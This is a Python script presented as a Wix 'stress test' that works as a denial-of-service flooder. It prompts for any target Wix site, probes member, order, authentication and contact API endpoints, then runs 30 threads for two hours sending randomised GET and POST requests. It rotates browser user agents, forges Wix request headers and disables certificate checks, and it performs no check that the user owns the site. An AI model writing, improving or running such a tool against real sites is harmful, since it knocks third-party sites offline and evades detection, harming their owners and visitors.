import requests
import time
import json
import random
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class WixTester:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]
        self.headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "X-Wix-Client-Artifact-Id": "wix-thunderbolt"
        }
        # Common Wix endpoints and API paths
        self.endpoints = [
            "_api/v2/dynamicmodel",
            "_api/v2/pages",
            "_api/v2/site-members",
            "_api/v2/data/collections",
            "_api/v2/settings",
            "_api/v2/forms",
            "_api/v2/stores/orders",
            "_api/v2/blog/posts",
            "_api/v2/bookings",
            "_site-api",
            "_functions"
        ]
        self.payloads = {
            "auth_test": {
                "email": "test@example.com",
                "password": "test123",
                "type": "login"
            },
            "data_test": {
                "collectionName": "Pages",
                "dataQuery": {
                    "filter": {},
                    "sort": [],
                    "paging": {
                        "offset": 0,
                        "limit": 10
                    }
                }
            }
        }

    def get_random_user_agent(self):
        return random.choice(self.user_agents)

    def verify_endpoint(self, url, endpoint):
        """Verify endpoint availability before testing"""
        full_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
        try:
            response = requests.head(
                full_url,
                headers={"User-Agent": self.get_random_user_agent()},
                timeout=3,
                verify=False,
                allow_redirects=True
            )
            return 200 <= response.status_code < 404
        except:
            return False

    def discover_valid_endpoints(self, url):
        """Discover valid Wix endpoints"""
        print("[INFO] Discovering valid endpoints...")
        valid_endpoints = []
        
        # Additional Wix-specific endpoints
        additional_endpoints = [
            "_api/v2/authentication",
            "_api/v2/members",
            "_api/v2/contacts",
            "_api/v2/pricing-plans",
            "_api/v2/inbox",
            "_api/v2/events",
            "_api/v2/notifications",
            "_api/v2/activities",
            "_api/wix-code-public",
            "_api/cloud-data"
        ]
        
        self.endpoints.extend(additional_endpoints)
        
        for endpoint in self.endpoints:
            if self.verify_endpoint(url, endpoint):
                print(f"[SUCCESS] Found valid endpoint: {endpoint}")
                valid_endpoints.append(endpoint)
        
        if not valid_endpoints:
            print("[WARNING] No valid endpoints found. Using default endpoints.")
            return self.endpoints
        
        return valid_endpoints

    def send_request(self, method, url, endpoint, data=None):
        full_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
        self.headers["User-Agent"] = self.get_random_user_agent()
        
        # Add Wix-specific headers
        additional_headers = {
            "X-Wix-Request-Id": f"req_{random.randint(1000000, 9999999)}",
            "X-Wix-Site-Revision": str(random.randint(1, 100)),
            "X-Wix-App-Instance": f"wix-thunderbolt-{random.randint(1000, 9999)}",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty"
        }
        self.headers.update(additional_headers)
        
        try:
            if method.upper() == "GET":
                response = requests.get(
                    full_url, 
                    headers=self.headers, 
                    timeout=5, 
                    verify=False,
                    allow_redirects=True
                )
            else:
                if data:
                    # Add Wix-specific request parameters
                    data.update({
                        "instance": f"wix-instance-{random.randint(1000, 9999)}",
                        "timestamp": int(time.time() * 1000)
                    })
                
                response = requests.post(
                    full_url, 
                    json=data, 
                    headers=self.headers, 
                    timeout=5, 
                    verify=False,
                    allow_redirects=True
                )
            
            if response.status_code in [404, 403]:
                return None
            
            print(f"[{response.status_code}] {method} {full_url}")
            return response.text if response.ok else None
        except RequestException as e:
            print(f"[ERROR] {method} {full_url}: {e}")
            return None

    def flood(self, url, workers=10, duration=60):
        print(f"[INFO] Starting stress test on {url} for {duration}s with {workers} threads")
        
        # Find valid endpoints first
        valid_endpoints = self.discover_valid_endpoints(url)
        if not valid_endpoints:
            print("[ERROR] No valid endpoints found. Aborting test.")
            return
            
        self.endpoints = valid_endpoints
        start_time = time.time()

        def attack():
            while time.time() - start_time < duration:
                endpoint = random.choice(self.endpoints)
                method = random.choice(["GET", "POST"])
                payload = self.payloads.get("data_test") if method == "POST" else None
                result = self.send_request(method, url, endpoint, data=payload)
                if result:
                    time.sleep(random.uniform(0.1, 0.3))  # Reduce delay for successful requests
                else:
                    time.sleep(random.uniform(0.5, 1.0))  # Increase delay for failed requests

        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(attack) for _ in range(workers)]
            for future in futures:
                future.result()

def main():
    target_url = input("Enter target Wix site URL (e.g., https://example.wixsite.com): ").strip()
    if not (target_url.startswith("http://") or target_url.startswith("https://")):
        print("[ERROR] Invalid URL. Please include http:// or https://")
        return
    
    try:
        tester = WixTester()
        tester.flood(target_url, workers=30, duration=7200)
    except KeyboardInterrupt:
        print("\n[INFO] Test interrupted by user.")
    except Exception as e:
        print(f"[ERROR] Unexpected error occurred: {e}")

if __name__ == "__main__":
    main() 
